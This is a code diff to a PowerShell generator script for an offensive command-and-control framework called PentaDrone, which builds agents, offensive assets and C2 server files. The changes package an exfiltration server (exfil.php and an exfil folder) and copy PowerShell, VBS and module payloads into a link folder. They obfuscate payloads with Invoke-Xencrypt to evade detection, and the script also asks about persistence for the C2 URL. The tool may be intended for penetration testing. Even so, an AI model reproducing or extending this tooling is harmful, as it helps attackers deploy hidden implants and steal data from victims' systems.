@@ -21,7 +21,10 @@
 
 Write-Host "PentaDrone Generator v3.0 " -ForegroundColor DarkGreen;
 Write-Host "Generate pentaDrone Agents, Offensives Assets and C2 files
- - by @thebenygreen - @eyesopensec" 
+ - by @thebenygreen - @eyesopensec 
+ 
+ ======================================================================
+ " 
 
 ############## ENCRYPTION BLOCK ##########################################################
 function Create-AesManagedObject($key, $IV) {
@@ -77,7 +80,7 @@ function Decrypt-String($key, $encryptedStringWithIV) {
 
 # Get full path of the actual script
 $ScriptDir = Split-Path $script:MyInvocation.MyCommand.Path
-New-Item -Path $ScriptDir -Name "Package" -ItemType "directory"
+If (Test-Path  $ScriptDir\Package){ } else { New-Item -Path $ScriptDir -Name "Package" -ItemType "directory" }
 
 $choice0 = Read-Host -Prompt 'Do you need to setup persistence for your C2 URL ? (y/n)'
 if ($choice0 -eq "y") {
@@ -739,45 +742,58 @@ copy "$ScriptDir\Build\JSRatServer.ps1" "$ScriptDir\Package\Client"
 #Write-Host "Clean tasks"
 Write-Host "---- FINISH ------> 100 %" -ForegroundColor Yellow;
 
-Write-Host "CONTENT GENERATED IN FOLDER c2c MUST BE COPY&PASTE IN THE LINKFOLDER OF YOUR ACTUAL C2SERVER"
+Write-Host "CONTENT GENERATED IN FOLDER c2c MUST BE COPY&PASTE IN THE LINKFOLDER OF YOUR ACTUAL Server"
 
 $ooo = Read-Host -Prompt 'OK'
 }
 
 #################  SERVER C2 ENCRYPTION #############################################
+$ScriptDir = Split-Path $script:MyInvocation.MyCommand.Path
+Get-Content "$ScriptDir\config.ini" | ForEach-Object -Begin {$settings=@{}} -Process {$store = [regex]::split($_,'='); if(($store[0].CompareTo("") -ne 0) -and ($store[0].StartsWith("[") -ne $True) -and ($store[0].StartsWith("#") -ne $True)) {$settings.Add($store[0], $store[1])}}
+$linkfolder = $settings.Get_Item("linkfolder")
+
 $choice2 = Read-Host -Prompt 'Do you want to generate C2 Server files ? (y/n)'
 if ($choice2 -eq "y") {
 
-If (Test-Path  $ScriptDir\Package\C2Server){ Remove-Item -path $ScriptDir\Package\C2Server }
-New-Item -Path $ScriptDir\Package -Name "C2Server" -ItemType "directory"
-md $ScriptDir\Package\C2Server\$linkfolder
-md $ScriptDir\Package\C2Server\exfil
-md $ScriptDir\Package\C2Server\ui
-Import-Module $ScriptDir\xencrypt.ps1
+If (Test-Path  $ScriptDir\Package\Server){ Remove-Item -path $ScriptDir\Package\Server }
+New-Item -Path $ScriptDir\Package -Name "Server" -ItemType "directory"
+md $ScriptDir\Package\Server\$linkfolder
+md $ScriptDir\Package\Server\exfil
+md $ScriptDir\Package\Server\ui
+Import-Module $ScriptDir\Build\xencrypt.ps1
+$ScriptDir = Split-Path $script:MyInvocation.MyCommand.Path
+copy $ScriptDir\www\exfil.php $ScriptDir\Package\Server
+copy $ScriptDir\www\index.html $ScriptDir\Package\Server
+copy $ScriptDir\www\exfil\*.* $ScriptDir\Package\Server\exfil
+copy $ScriptDir\www\ui\* $ScriptDir\Package\Server\ui
+# Link Folder
+copy $ScriptDir\www\link\*.html $ScriptDir\Package\Server\$linkfolder
+copy $ScriptDir\www\link\*.php $ScriptDir\Package\Server\$linkfolder
+copy $ScriptDir\www\link\*.png $ScriptDir\Package\Server\$linkfolder
+copy $ScriptDir\www\link\*.xml $ScriptDir\Package\Server\$linkfolder
+copy $ScriptDir\www\link\*.psm1 $ScriptDir\Package\Server\$linkfolder
+copy $ScriptDir\www\link\*.psm1 $ScriptDir\Package\Server\$linkfolder
+copy $ScriptDir\www\link\*.css $ScriptDir\Package\Server\$linkfolder
+copy $ScriptDir\www\link\*.ps1 $ScriptDir\Package\Server\$linkfolder
+copy $ScriptDir\www\link\*.vbs $ScriptDir\Package\Server\$linkfolder
 
-$extensionArray = "ps1","txt"
+#$extensionArray = "ps1","txt"
+$extensionArray = "txt"
 foreach ($extension in $extensionArray) {
-	Get-ChildItem -Path $ScriptDir\www\$linkfolder -Recurse -ErrorAction SilentlyContinue -Filter *.$extension |  Where-Object { $_.Extension -eq ".$extension" }|foreach {$path = Resolve-Path $_.FullName ; Invoke-Xencrypt -InFile $path -OutFile "$ScriptDir\Package\C2Server\$linkfolder\$_" -Iterations 3; $path}  
+	Get-ChildItem -Path $ScriptDir\www\link -Recurse -ErrorAction SilentlyContinue -Filter *.$extension |  Where-Object { $_.Extension -eq ".$extension" }|foreach {$path = Resolve-Path $_.FullName ; Invoke-Xencrypt -InFile $path -OutFile "$ScriptDir\Package\Server\$linkfolder\$_" -Iterations 3; $path}  
 	}
-
+	
+if ($choice1 -eq "y") {
+	$ScriptDir = Split-Path $script:MyInvocation.MyCommand.Path
+	copy $ScriptDir\Package\Client\c2c\*.* $ScriptDir\Package\Server\$linkfolder
 }
 
-Write-Host "READY ?"
-$ooo = Read-Host -Prompt 'OK'
+Write-Host "READY ?" -ForegroundColor DarkGreen;
+$ooo = Read-Host -Prompt 'PRESS ANY KEY TO CLOSE' 
+}
+
+
 <##>
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 
 
